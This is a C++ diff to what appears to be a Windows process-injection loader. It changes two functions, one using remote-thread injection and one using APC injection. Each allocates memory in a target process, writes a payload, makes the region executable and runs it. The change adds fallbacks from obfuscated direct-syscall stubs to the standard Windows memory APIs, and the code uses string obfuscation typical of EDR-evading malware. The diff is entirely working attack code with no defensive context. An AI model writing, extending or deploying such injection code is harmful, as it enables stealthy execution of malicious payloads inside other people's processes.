@@ -173,20 +173,37 @@ BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload,
     // 2. Allocate RW region
     PVOID  base   = nullptr;
     SIZE_T region = payloadSize;
-    NTSTATUS st = g_Syscalls.NtAllocateVirtualMemory(
-        hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (st != 0) { CloseTarget(hProc); return FALSE; }
+    if (g_Syscalls.NtAllocateVirtualMemory) {
+        NTSTATUS st = g_Syscalls.NtAllocateVirtualMemory(
+            hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (st != 0) { CloseTarget(hProc); return FALSE; }
+    } else {
+        base = VirtualAllocEx(hProc, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!base) { CloseTarget(hProc); return FALSE; }
+    }
 
     // 3. Write payload
     SIZE_T written = 0;
-    st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
-    if (st != 0 || written != payloadSize) { CloseTarget(hProc); return FALSE; }
+    if (g_Syscalls.NtWriteVirtualMemory) {
+        NTSTATUS st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
+        if (st != 0 || written != payloadSize) { CloseTarget(hProc); return FALSE; }
+    } else {
+        if (!WriteProcessMemory(hProc, base, payload, payloadSize, &written) || written != payloadSize) {
+            CloseTarget(hProc); return FALSE;
+        }
+    }
 
     // 4. Flip to RX
-    ULONG oldProt = 0;
-    st = g_Syscalls.NtProtectVirtualMemory(
-        hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
-    if (st != 0) { CloseTarget(hProc); return FALSE; }
+    if (g_Syscalls.NtProtectVirtualMemory) {
+        ULONG oldProt = 0;
+        NTSTATUS st = g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
+        if (st != 0) { CloseTarget(hProc); return FALSE; }
+    } else {
+        DWORD oldProt = 0;
+        if (!VirtualProtectEx(hProc, base, payloadSize, PAGE_EXECUTE_READ, &oldProt)) {
+            CloseTarget(hProc); return FALSE;
+        }
+    }
 
     // 5. Create remote thread
     HANDLE hThread = CreateRemoteThreadFallback(hProc, base);
@@ -215,18 +232,35 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
 
     PVOID base = nullptr;
     SIZE_T region = payloadSize;
-    NTSTATUS st = g_Syscalls.NtAllocateVirtualMemory(
-        hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (st != 0) { CloseTarget(hProc); return FALSE; }
+    if (g_Syscalls.NtAllocateVirtualMemory) {
+        if (g_Syscalls.NtAllocateVirtualMemory(hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
+            CloseTarget(hProc); return FALSE;
+        }
+    } else {
+        base = VirtualAllocEx(hProc, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!base) { CloseTarget(hProc); return FALSE; }
+    }
 
     SIZE_T written = 0;
-    st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
-    if (st != 0 || written != payloadSize) { CloseTarget(hProc); return FALSE; }
+    if (g_Syscalls.NtWriteVirtualMemory) {
+        if (g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written) != 0 || written != payloadSize) {
+            CloseTarget(hProc); return FALSE;
+        }
+    } else if (!WriteProcessMemory(hProc, base, payload, payloadSize, &written) || written != payloadSize) {
+        CloseTarget(hProc); return FALSE;
+    }
 
-    ULONG oldProt = 0;
-    st = g_Syscalls.NtProtectVirtualMemory(
-        hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
-    if (st != 0) { CloseTarget(hProc); return FALSE; }
+    if (g_Syscalls.NtProtectVirtualMemory) {
+        ULONG oldProt = 0;
+        if (g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt) != 0) {
+            CloseTarget(hProc); return FALSE;
+        }
+    } else {
+        DWORD oldProt = 0;
+        if (!VirtualProtectEx(hProc, base, payloadSize, PAGE_EXECUTE_READ, &oldProt)) {
+            CloseTarget(hProc); return FALSE;
+        }
+    }
 
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
     if (!hKernel32) { CloseTarget(hProc); return FALSE; }
